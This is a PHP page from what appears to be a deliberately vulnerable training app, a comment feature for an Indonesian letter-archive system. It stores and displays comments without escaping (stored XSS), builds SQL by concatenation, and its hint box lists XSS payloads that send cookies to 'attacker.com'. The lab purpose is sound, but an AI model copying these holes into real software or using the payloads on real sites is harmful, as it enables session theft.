<?php
require_once 'config.php';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'] ?? '';
    $username = $_SESSION['username'];
    
    // VULNERABLE: Stored XSS
    // User input is stored directly in database without sanitization
    // When displayed, it's not escaped either
    $query = "INSERT INTO comments (username, email, content, created_at) VALUES ('" . $username . "', 'user@dvwa.local', '" . addslashes($comment) . "', NOW())";
    
    if ($mysqli->query($query)) {
        $message = "Komentar berhasil diposting!";
    } else {
        $message = "Kesalahan saat memposting komentar: " . $mysqli->error;
    }
}

// Check if there's a reset message from reset_db.php
if (isset($_SESSION['reset_message'])) {
    $message = $_SESSION['reset_message'];
    unset($_SESSION['reset_message']);
}

// Fetch all comments
$query = "SELECT username, content, created_at FROM comments ORDER BY created_at DESC LIMIT 20";
$result = $mysqli->query($query);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sistem Arsip Surat - Komentar Surat</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .back-link {
            color: #f00;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }
        .back-link:hover {
            text-decoration: underline;
        }
        h1 {
            color: #f00;
        }
        .info-box {
            background-color: #222;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #f00;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        textarea {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            border-radius: 3px;
            min-height: 80px;
            font-family: Arial, sans-serif;
        }
        button {
            padding: 10px 20px;
            background-color: #f00;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #c00;
        }
        .message {
            background-color: #1a3a1a;
            color: #6b6;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
        }
        .comments {
            background-color: #222;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .comment {
            background-color: #333;
            padding: 15px;
            border-radius: 3px;
            margin-bottom: 10px;
            border-left: 4px solid #555;
        }
        .comment-meta {
            color: #aaa;
            font-size: 12px;
            margin-bottom: 10px;
        }
        .comment-author {
            font-weight: bold;
            color: #f00;
        }
        .comment-content {
            color: #fff;
            word-wrap: break-word;
        }
        .hint {
            background-color: #1a3a1a;
            color: #6b6;
            padding: 10px;
            border-radius: 3px;
            margin-top: 10px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="dashboard_id.php" class="back-link">← Kembali ke Dasbor</a>
        <h1>Komentar Surat</h1>
        <div class="info-box">
            <h2>Tambah Komentar Surat</h2>
            <p>Tambahkan komentar pada surat masuk/keluar. Komentar akan tampil ke semua user. Fitur ini rentan terhadap Stored XSS.</p>
        </div>
        <form method="POST" action="reset_db.php" style="margin-bottom: 20px;">
            <input type="hidden" name="page" value="xss_stored_id.php">
            <button type="submit" name="reset_db" style="background-color: #ff6600; padding: 8px 15px; font-size: 14px;">🔄 Reset Komentar</button>
        </form>
        <form method="POST">
            <div class="form-group">
                <label for="comment">Komentar Surat</label>
                <textarea id="comment" name="comment" required></textarea>
            </div>
            <button type="submit">Posting Komentar</button>
        </form>
        <div class="hint">
            <strong>Petunjuk Eksploitasi:</strong><br>
            • Coba: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Skrip akan dieksekusi untuk setiap user yang melihat komentar<br>
            • Coba: <code>&lt;img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)"&gt;</code> - Curi cookie user<br>
            • Coba: <code>&lt;svg onload="document.location='https://attacker.com/?cookie='+document.cookie"&gt;</code> - Redirect dengan pencurian data
        </div>
        
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <div class="comments">
            <h3>Daftar Komentar (<?php echo $result->num_rows; ?>)</h3>
            <?php if ($result->num_rows > 0): ?>
                <?php while ($row = $result->fetch_assoc()): ?>
                    <div class="comment">
                        <div class="comment-meta">
                            <span class="comment-author"><?php echo htmlspecialchars($row['username']); ?></span>
                            - <?php echo htmlspecialchars($row['created_at']); ?>
                        </div>
                        <div class="comment-content">
                            <?php echo $row['content']; ?>
                        </div>
                    </div>
                <?php endwhile; ?>
            <?php else: ?>
                <p style="color: #aaa;">Belum ada komentar. Jadilah yang pertama posting!</p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
